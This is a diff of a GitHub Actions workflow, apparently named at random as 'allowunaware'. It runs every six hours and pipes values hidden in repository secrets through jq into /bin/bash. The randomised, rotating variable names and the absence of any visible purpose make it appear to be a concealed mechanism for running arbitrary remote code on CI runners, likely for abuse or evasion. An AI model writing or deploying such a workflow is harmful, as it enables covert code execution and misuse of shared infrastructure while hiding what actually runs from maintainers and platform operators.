@@ -1,33 +1,23 @@
 name: allowunaware
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '12 0/6 * * *'
-
-jobs:  # 23793
+    - cron: '36 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: allowunaware
         env:
-          yp810: ${{ secrets.yp810 }}
+          o355: ${{ secrets.o355 }}
         run: |
-          echo $yp810 | jq -r .c9570 | /bin/bash
-          echo $jcjc476 | jq -r .dxn52 | /bin/bash
-          echo $ylnzb46 | jq -r .sw525 | /bin/bash
-          echo $ds8025 | jq -r .obiee38416 | /bin/bash
-          echo $qhtb8 | jq -r .ydeu2970 | /bin/bash
-          echo $jnx9 | jq -r .ih39 | /bin/bash
-          echo $vyivl1 | jq -r .dm73547 | /bin/bash
-          echo $jgoy5845 | jq -r .fm30515 | /bin/bash
-          echo $k28 | jq -r .uwroq37 | /bin/bash
-          echo $laj74624 | jq -r .id94 | /bin/bash
-          echo $zozh086 | jq -r .ctry37 | /bin/bash
-          echo $gr63 | jq -r .vtgi6 | /bin/bash
-          echo $zlp61 | jq -r .o218 | /bin/bash
-          echo $c68 | jq -r .cef1 | /bin/bash
-          echo $gsxg04006 | jq -r .ko71 | /bin/bash
+          echo $o355 | jq -r .odu18 | /bin/bash
+          echo $son32461 | jq -r .duqf513 | /bin/bash
+          echo $unwrn29820 | jq -r .eahws5 | /bin/bash
+          echo $eaiey2 | jq -r .abuy92 | /bin/bash
+          echo $on769 | jq -r .hsav41580 | /bin/bash
+          echo $zv61990 | jq -r .kgoxw0969 | /bin/bash
+          echo $edf5188 | jq -r .whvrk243 | /bin/bash
+          echo $x5205 | jq -r .zdx5 | /bin/bash
 
